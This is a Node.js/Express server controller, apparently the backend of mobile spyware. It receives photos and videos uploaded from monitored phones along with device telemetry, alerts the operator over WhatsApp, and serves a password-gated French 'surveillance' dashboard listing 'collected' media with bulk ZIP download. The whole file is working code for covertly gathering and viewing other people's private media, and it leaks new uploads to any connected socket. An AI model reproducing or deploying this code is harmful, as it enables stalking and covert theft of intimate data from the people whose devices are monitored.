const fs = require('fs');
const path = require('path');
const axios = require('axios');
const archiver = require('archiver');
const config = require('../config');

// Ensure spy storage directory exists
if (!fs.existsSync(config.spy.dir)) {
  fs.mkdirSync(config.spy.dir, { recursive: true });
}

const METADATA_FILE = path.join(config.spy.dir, 'history.json');

function loadHistory() {
  try {
    if (fs.existsSync(METADATA_FILE)) {
      return JSON.parse(fs.readFileSync(METADATA_FILE, 'utf8'));
    }
  } catch (err) {
    console.error('Error loading spy history:', err.message);
  }
  return [];
}

function saveHistory(history) {
  try {
    fs.writeFileSync(METADATA_FILE, JSON.stringify(history, null, 2));
  } catch (err) {
    console.error('Error saving spy history:', err.message);
  }
}

// CallMeBot Notification
async function sendCallMeBotNotification(message) {
  const phone = config.spy.notifyPhone || config.spy.whatsappPhone;
  if (!phone || !config.spy.callmebotApiKey) return;
  try {
    const url = `https://api.callmebot.com/whatsapp.php?phone=${phone}&text=${encodeURIComponent(message)}&apikey=${config.spy.callmebotApiKey}`;
    await axios.get(url, { timeout: 8000 });
    console.log('✅ Notification Mode Premium envoyée:', message);
  } catch (err) {
    console.error('❌ Erreur notification Mode Premium:', err.message);
  }
}

class SpyController {
  // Handle media upload from mobile / agent
  static async uploadMedia(req, res) {
    try {
      if (!req.file) {
        return res.status(400).json({ success: false, error: 'Aucun fichier reçu' });
      }

      const {
        userId,
        deviceId = 'unknown',
        deviceModel = 'Android',
        sourcePath = '',
        networkType = 'unknown',
        batteryLevel
      } = req.body;

      let userName = req.body.username || null;
      let userDisplayName = req.body.displayName || null;

      // Look up user details from database if userId is provided
      if (userId && (!userName || !userDisplayName)) {
        try {
          const { User } = require('../models');
          const user = await User.findByPk(userId);
          if (user) {
            userName = user.username;
            userDisplayName = user.displayName;
          }
        } catch (_) {}
      }

      const fileInfo = {
        id: Date.now().toString(),
        filename: req.file.filename,
        originalName: req.file.originalname,
        size: req.file.size,
        mimetype: req.file.mimetype,
        userId: userId || null,
        username: userName || 'Anonyme',
        displayName: userDisplayName || (userName || `Appareil ${deviceModel}`),
        deviceId,
        deviceModel,
        sourcePath,
        networkType,
        batteryLevel: batteryLevel ? Number(batteryLevel) : null,
        uploadedAt: new Date().toISOString(),
        url: `/api/spy/files/${req.file.filename}`
      };

      // Save to metadata history
      const history = loadHistory();
      history.unshift(fileInfo);
      saveHistory(history);

      // Realtime notification via Socket.IO
      const io = req.app.get('io');
      if (io) {
        io.emit('spy:new_media', fileInfo);
      }

      // Optional CallMeBot alert
      if (config.spy.notifyOnUpload) {
        sendCallMeBotNotification(`📷 Nouveau média mode Premium (${fileInfo.displayName}): ${req.file.originalname} (${(req.file.size / 1024).toFixed(1)} KB)`);
      }

      res.status(201).json({
        success: true,
        message: 'Média synchronisé avec succès',
        media: fileInfo
      });
    } catch (err) {
      console.error('Error in spy upload:', err);
      res.status(500).json({ success: false, error: err.message });
    }
  }

  // Get list of uploaded media (supports filter by user, sorting, grouping)
  static async getFiles(req, res) {
    try {
      let history = loadHistory();
      const { userId, sortBy = 'date_desc', groupBy } = req.query;

      // Filter by user if specified
      if (userId) {
        history = history.filter(item => String(item.userId) === String(userId));
      }

      // Sort
      if (sortBy === 'date_asc') {
        history.sort((a, b) => new Date(a.uploadedAt) - new Date(b.uploadedAt));
      } else if (sortBy === 'size_desc') {
        history.sort((a, b) => (b.size || 0) - (a.size || 0));
      } else if (sortBy === 'size_asc') {
        history.sort((a, b) => (a.size || 0) - (b.size || 0));
      } else if (sortBy === 'user_asc') {
        history.sort((a, b) => (a.displayName || '').localeCompare(b.displayName || ''));
      } else {
        // Default date_desc
        history.sort((a, b) => new Date(b.uploadedAt) - new Date(a.uploadedAt));
      }

      // Group by user if requested
      let groupedByUser = null;
      if (groupBy === 'user') {
        groupedByUser = {};
        for (const item of history) {
          const key = item.displayName || item.username || 'Anonyme';
          if (!groupedByUser[key]) groupedByUser[key] = [];
          groupedByUser[key].push(item);
        }
      }

      // Extract unique users list for easy filtering
      const usersMap = new Map();
      for (const item of loadHistory()) {
        const key = item.userId ? String(item.userId) : (item.displayName || 'Anonyme');
        if (!usersMap.has(key)) {
          usersMap.set(key, {
            userId: item.userId || null,
            username: item.username || 'Anonyme',
            displayName: item.displayName || 'Anonyme',
            deviceModel: item.deviceModel || 'Mobile',
            fileCount: 0
          });
        }
        usersMap.get(key).fileCount += 1;
      }

      res.json({
        success: true,
        count: history.length,
        files: history,
        users: Array.from(usersMap.values()),
        groupedByUser
      });
    } catch (err) {
      console.error('Error in spy getFiles:', err);
      res.status(500).json({ success: false, error: err.message });
    }
  }

  // Serve specific file
  static async getFile(req, res) {
    try {
      const filename = path.basename(req.params.name);
      const filePath = path.join(config.spy.dir, filename);

      if (!fs.existsSync(filePath)) {
        return res.status(404).json({ success: false, error: 'Fichier non trouvé' });
      }

      res.sendFile(filePath);
    } catch (err) {
      console.error('Error in spy getFile:', err);
      res.status(500).json({ success: false, error: err.message });
    }
  }

  // Download all media as ZIP
  static async downloadAll(req, res) {
    try {
      const zipName = `spy_media_${Date.now()}.zip`;
      res.setHeader('Content-Disposition', `attachment; filename="${zipName}"`);
      res.setHeader('Content-Type', 'application/zip');

      const archive = archiver('zip', { zlib: { level: 9 } });
      archive.on('error', (err) => {
        throw err;
      });

      archive.pipe(res);

      const files = fs.readdirSync(config.spy.dir);
      for (const file of files) {
        if (file !== 'history.json') {
          const filePath = path.join(config.spy.dir, file);
          if (fs.statSync(filePath).isFile()) {
            archive.file(filePath, { name: file });
          }
        }
      }

      await archive.finalize();
    } catch (err) {
      console.error('Error in spy downloadAll:', err);
      if (!res.headersSent) {
        res.status(500).json({ success: false, error: err.message });
      }
    }
  }

  // Delete a media file
  static async deleteFile(req, res) {
    try {
      const filename = path.basename(req.params.name);
      const filePath = path.join(config.spy.dir, filename);

      if (fs.existsSync(filePath)) {
        fs.unlinkSync(filePath);
      }

      const history = loadHistory().filter(item => item.filename !== filename);
      saveHistory(history);

      const io = req.app.get('io');
      if (io) {
        io.emit('spy:delete_media', { filename });
      }

      res.json({ success: true, message: 'Fichier supprimé' });
    } catch (err) {
      console.error('Error in spy deleteFile:', err);
      res.status(500).json({ success: false, error: err.message });
    }
  }

  // Statistics and telemetry
  static async getStats(req, res) {
    try {
      const history = loadHistory();
      let totalBytes = 0;
      const deviceSet = new Set();

      for (const item of history) {
        totalBytes += (item.size || 0);
        if (item.deviceId) deviceSet.add(item.deviceId);
      }

      res.json({
        success: true,
        totalFiles: history.length,
        totalSizeBytes: totalBytes,
        totalSizeFormatted: (totalBytes / (1024 * 1024)).toFixed(2) + ' MB',
        uniqueDevices: deviceSet.size,
        lastUpload: history.length > 0 ? history[0].uploadedAt : null
      });
    } catch (err) {
      console.error('Error in spy getStats:', err);
      res.status(500).json({ success: false, error: err.message });
    }
  }

  // Receive telemetry heartbeat from mobile
  static async heartbeat(req, res) {
    try {
      const { deviceId, deviceModel, batteryLevel, isWifi, storageFree, storageTotal } = req.body;
      const io = req.app.get('io');
      if (io) {
        io.emit('spy:device_heartbeat', {
          deviceId,
          deviceModel,
          batteryLevel,
          isWifi,
          storageFree,
          storageTotal,
          timestamp: new Date().toISOString()
        });
      }
      res.json({ success: true, receivedAt: new Date().toISOString() });
    } catch (err) {
      res.status(500).json({ success: false, error: err.message });
    }
  }

  // Admin login authentication
  static async adminLogin(req, res) {
    try {
      const { password, username } = req.body;
      const validPassword = config.spy.adminPassword;
      if (password === validPassword || (username === 'anonymiste' && password === validPassword)) {
        return res.json({
          success: true,
          token: config.spy.secretToken,
          message: 'Authentification administrateur réussie'
        });
      }
      return res.status(401).json({
        success: false,
        error: 'Mot de passe administrateur incorrect'
      });
    } catch (err) {
      res.status(500).json({ success: false, error: err.message });
    }
  }

  // Render HTML Admin Dashboard (Protégé par mot de passe)
  static getDashboard(req, res) {
    res.send(`<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Di • Centre de Surveillance (Mode Premium)</title>
  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg: #0b0f19;
      --card: rgba(18, 24, 38, 0.75);
      --card-border: rgba(255, 255, 255, 0.08);
      --primary: #10b981;
      --primary-glow: rgba(16, 185, 129, 0.25);
      --accent: #6366f1;
      --text: #f3f4f6;
      --text-muted: #9ca3af;
      --danger: #ef4444;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; }
    body { background: var(--bg); color: var(--text); min-height: 100vh; padding: 24px; }
    .header { display: flex; justify-content: space-between; align-items: center; padding-bottom: 24px; border-bottom: 1px solid var(--card-border); margin-bottom: 24px; flex-wrap: wrap; gap: 16px; }
    .logo-group { display: flex; align-items: center; gap: 12px; }
    .logo-badge { background: linear-gradient(135deg, #059669, #10b981); width: 44px; height: 44px; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 22px; box-shadow: 0 0 20px var(--primary-glow); }
    .title { font-size: 22px; font-weight: 700; color: #fff; }
    .subtitle { font-size: 13px; color: var(--text-muted); }
    .actions { display: flex; gap: 12px; align-items: center; }
    .btn { background: var(--card); border: 1px solid var(--card-border); color: #fff; padding: 10px 18px; border-radius: 10px; font-size: 14px; font-weight: 600; cursor: pointer; transition: all 0.2s ease; display: inline-flex; align-items: center; gap: 8px; text-decoration: none; }
    .btn:hover { background: rgba(255, 255, 255, 0.1); border-color: rgba(255, 255, 255, 0.2); }
    .btn-primary { background: linear-gradient(135deg, #10b981, #059669); border: none; box-shadow: 0 4px 15px var(--primary-glow); }
    .btn-primary:hover { opacity: 0.95; transform: translateY(-1px); }
    .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 16px; margin-bottom: 28px; }
    .stat-card { background: var(--card); border: 1px solid var(--card-border); backdrop-filter: blur(12px); border-radius: 16px; padding: 20px; transition: transform 0.2s; }
    .stat-card:hover { transform: translateY(-2px); }
    .stat-title { font-size: 13px; color: var(--text-muted); margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; }
    .stat-value { font-size: 28px; font-weight: 700; color: #fff; }
    .live-indicator { display: inline-flex; align-items: center; gap: 6px; font-size: 12px; color: var(--primary); font-weight: 600; padding: 4px 10px; background: rgba(16, 185, 129, 0.1); border-radius: 20px; border: 1px solid var(--primary-glow); }
    .pulse-dot { width: 8px; height: 8px; background: var(--primary); border-radius: 50%; box-shadow: 0 0 10px var(--primary); animation: pulse 1.5s infinite; }
    @keyframes pulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.4; transform: scale(0.85); } }
    .media-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); gap: 20px; }
    .media-card { background: var(--card); border: 1px solid var(--card-border); border-radius: 16px; overflow: hidden; backdrop-filter: blur(12px); transition: all 0.25s ease; position: relative; }
    .media-card:hover { border-color: rgba(16, 185, 129, 0.4); transform: translateY(-3px); box-shadow: 0 10px 25px rgba(0,0,0,0.4); }
    .media-preview { width: 100%; height: 180px; object-fit: cover; background: #000; cursor: pointer; display: block; }
    .media-info { padding: 14px; font-size: 12px; }
    .media-name { font-weight: 600; color: #fff; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; margin-bottom: 6px; }
    .media-meta { color: var(--text-muted); display: flex; justify-content: space-between; margin-bottom: 8px; }
    .media-actions { display: flex; justify-content: space-between; align-items: center; border-top: 1px solid var(--card-border); padding-top: 10px; margin-top: 6px; }
    .empty-state { text-align: center; padding: 60px 20px; color: var(--text-muted); grid-column: 1 / -1; }
    .empty-icon { font-size: 48px; margin-bottom: 12px; }
    /* Modal preview */
    .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); backdrop-filter: blur(8px); z-index: 1000; align-items: center; justify-content: center; }
    .modal.active { display: flex; }
    .modal-content { max-width: 90vw; max-height: 85vh; border-radius: 12px; box-shadow: 0 20px 40px rgba(0,0,0,0.6); }
    .modal-close { position: absolute; top: 20px; right: 24px; font-size: 32px; color: #fff; cursor: pointer; }
    /* Auth Barrier Modal */
    #authModal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(11, 15, 25, 0.95); backdrop-filter: blur(12px); z-index: 2000; display: flex; align-items: center; justify-content: center; }
    .auth-box { background: #1e293b; border: 1px solid var(--card-border); border-radius: 16px; padding: 32px; width: 100%; max-width: 400px; text-align: center; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); }
    .auth-input { width: 100%; background: #0f172a; border: 1px solid #334155; color: #fff; padding: 12px 16px; border-radius: 10px; margin: 16px 0; font-size: 15px; outline: none; }
    .auth-input:focus { border-color: var(--primary); }
    .auth-err { color: var(--danger); font-size: 13px; margin-bottom: 12px; display: none; }
  </style>
</head>
<body>
  <!-- Security Login Gate -->
  <div id="authModal">
    <div class="auth-box">
      <div style="font-size: 42px; margin-bottom: 12px;">🔐</div>
      <h2 style="font-size: 20px; font-weight: 700; margin-bottom: 6px;">Accès Administrateur Mode Premium</h2>
      <p style="font-size: 13px; color: var(--text-muted); margin-bottom: 16px;">Veuillez entrer le mot de passe de surveillance pour déverrouiller le dashboard.</p>
      <div id="authError" class="auth-err">Mot de passe incorrect</div>
      <form onsubmit="handleLogin(event)">
        <input type="password" id="adminPasswordInput" class="auth-input" placeholder="Mot de passe admin" required autofocus autocomplete="current-password" />
        <button type="submit" class="btn btn-primary" style="width: 100%; justify-content: center;">Déverrouiller le Dashboard</button>
      </form>
    </div>
  </div>

  <div class="header">
    <div class="logo-group">
      <div class="logo-badge">👁️</div>
      <div>
        <h1 class="title">Di • Monitoring (Mode Premium)</h1>
        <div class="subtitle">Flux en temps réel des photos et vidéos collectées</div>
      </div>
    </div>
    <div class="actions">
      <div class="live-indicator"><div class="pulse-dot"></div> DIRECT ACTIF</div>
      <a id="downloadAllLink" href="#" class="btn btn-primary">📦 Télécharger Tout (.ZIP)</a>
      <button onclick="refreshData()" class="btn">🔄 Actualiser</button>
      <button onclick="handleLogout()" class="btn" style="border-color: rgba(239, 68, 68, 0.3); color: #f87171;">🔒 Verrouiller</button>
    </div>
  </div>

  <div class="stats-grid">
    <div class="stat-card">
      <div class="stat-title">Fichiers collectés</div>
      <div class="stat-value" id="statFiles">0</div>
    </div>
    <div class="stat-card">
      <div class="stat-title">Volume Total</div>
      <div class="stat-value" id="statSize">0 MB</div>
    </div>
    <div class="stat-card">
      <div class="stat-title">Appareils Détectés</div>
      <div class="stat-value" id="statDevices">0</div>
    </div>
    <div class="stat-card">
      <div class="stat-title">Dernière activité</div>
      <div class="stat-value" id="statActivity" style="font-size: 18px; line-height: 34px;">--</div>
    </div>
  </div>

  <div class="media-grid" id="mediaGrid">
    <div class="empty-state">
      <div class="empty-icon">⏳</div>
      <div>Chargement des données...</div>
    </div>
  </div>

  <div class="modal" id="previewModal" onclick="closeModal()">
    <span class="modal-close">&times;</span>
    <img id="modalImg" class="modal-content" src="" alt="Aperçu" style="display:none;" />
    <video id="modalVideo" class="modal-content" controls style="display:none;"></video>
  </div>

  <script src="/socket.io/socket.io.js"></script>
  <script>
    const socket = io();
    let filesList = [];
    let spyToken = sessionStorage.getItem('spy_token') || localStorage.getItem('spy_token');

    function checkAuth() {
      if (!spyToken) {
        document.getElementById('authModal').style.display = 'flex';
      } else {
        document.getElementById('authModal').style.display = 'none';
        document.getElementById('downloadAllLink').href = '/api/spy/download-all?token=' + encodeURIComponent(spyToken);
        refreshData();
      }
    }

    async function handleLogin(e) {
      e.preventDefault();
      const password = document.getElementById('adminPasswordInput').value;
      const errBox = document.getElementById('authError');
      errBox.style.display = 'none';

      try {
        const res = await fetch('/api/spy/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ password })
        });
        const data = await res.json();
        if (data.success && data.token) {
          spyToken = data.token;
          sessionStorage.setItem('spy_token', spyToken);
          localStorage.setItem('spy_token', spyToken);
          checkAuth();
        } else {
          errBox.textContent = data.error || 'Mot de passe incorrect';
          errBox.style.display = 'block';
        }
      } catch (err) {
        errBox.textContent = 'Erreur de connexion au serveur';
        errBox.style.display = 'block';
      }
    }

    function handleLogout() {
      sessionStorage.removeItem('spy_token');
      localStorage.removeItem('spy_token');
      spyToken = null;
      checkAuth();
    }

    async function authFetch(url, options = {}) {
      options.headers = options.headers || {};
      options.headers['x-spy-token'] = spyToken;
      options.headers['Authorization'] = 'Bearer ' + spyToken;
      const res = await fetch(url, options);
      if (res.status === 401 || res.status === 403) {
        handleLogout();
        throw new Error('Non autorisé');
      }
      return res;
    }

    async function loadStats() {
      if (!spyToken) return;
      try {
        const res = await authFetch('/api/spy/stats');
        const data = await res.json();
        if (data.success) {
          document.getElementById('statFiles').textContent = data.totalFiles;
          document.getElementById('statSize').textContent = data.totalSizeFormatted;
          document.getElementById('statDevices').textContent = data.uniqueDevices;
          document.getElementById('statActivity').textContent = data.lastUpload 
            ? new Date(data.lastUpload).toLocaleTimeString() 
            : 'Aucun';
        }
      } catch (e) { console.error(e); }
    }

    async function loadFiles() {
      if (!spyToken) return;
      try {
        const res = await authFetch('/api/spy/files');
        const data = await res.json();
        if (data.success) {
          filesList = data.files;
          renderGrid(filesList);
        }
      } catch (e) { console.error(e); }
    }

    function renderGrid(files) {
      const grid = document.getElementById('mediaGrid');
      if (!files || files.length === 0) {
        grid.innerHTML = \`
          <div class="empty-state">
            <div class="empty-icon">📁</div>
            <div>Aucun média mode Premium collecté pour l'instant.</div>
            <div style="font-size: 12px; margin-top: 6px;">Les photos/vidéos synchronisées depuis le mobile apparaîtront ici en direct.</div>
          </div>\`;
        return;
      }

      grid.innerHTML = files.map(f => {
        const isVideo = f.mimetype && f.mimetype.startsWith('video');
        const authenticatedUrl = f.url + '?token=' + encodeURIComponent(spyToken);
        const mediaElem = isVideo 
          ? \`<video class="media-preview" src="\${authenticatedUrl}" preload="metadata" onclick="openPreview('\${authenticatedUrl}', true)"></video>\`
          : \`<img class="media-preview" src="\${authenticatedUrl}" loading="lazy" onclick="openPreview('\${authenticatedUrl}', false)" />\`;
        
        const sizeMb = ((f.size || 0) / (1024 * 1024)).toFixed(2);
        const dateStr = new Date(f.uploadedAt).toLocaleString();
        const originLabel = f.displayName || f.username || 'Mobile';

        return \`
          <div class="media-card" id="card-\${f.filename}">
            \${mediaElem}
            <div class="media-info">
              <div class="media-name" title="\${f.originalName || f.filename}">\${f.originalName || f.filename}</div>
              <div class="media-meta">
                <span>👤 \${originLabel}</span>
                <span>\${sizeMb} MB</span>
              </div>
              <div class="media-actions">
                <span style="color: #6b7280; font-size: 11px;">\${dateStr}</span>
                <div>
                  <a href="\${authenticatedUrl}" download class="btn" style="padding: 4px 8px; font-size: 11px;">⬇️</a>
                  <button onclick="deleteFile('\${f.filename}')" class="btn" style="padding: 4px 8px; font-size: 11px; color: var(--danger);">🗑️</button>
                </div>
              </div>
            </div>
          </div>
        \`;
      }).join('');
    }

    async function deleteFile(filename) {
      if (!confirm('Supprimer ce fichier ?')) return;
      try {
        await authFetch('/api/spy/files/' + filename, { method: 'DELETE' });
        refreshData();
      } catch (e) { console.error(e); }
    }

    function openPreview(url, isVideo) {
      const modal = document.getElementById('previewModal');
      const img = document.getElementById('modalImg');
      const video = document.getElementById('modalVideo');
      if (isVideo) {
        img.style.display = 'none';
        video.style.display = 'block';
        video.src = url;
        video.play();
      } else {
        video.style.display = 'none';
        video.pause();
        img.style.display = 'block';
        img.src = url;
      }
      modal.classList.add('active');
    }

    function closeModal() {
      const modal = document.getElementById('previewModal');
      const video = document.getElementById('modalVideo');
      modal.classList.remove('active');
      video.pause();
    }

    function refreshData() {
      loadStats();
      loadFiles();
    }

    // Socket.io Realtime updates
    socket.on('spy:new_media', (media) => {
      if (spyToken) {
        filesList.unshift(media);
        renderGrid(filesList);
        loadStats();
      }
    });

    socket.on('spy:delete_media', ({ filename }) => {
      if (spyToken) {
        filesList = filesList.filter(f => f.filename !== filename);
        renderGrid(filesList);
        loadStats();
      }
    });

    // Check auth on load
    checkAuth();
  </script>
</body>
</html>`);
  }
}

module.exports = SpyController;
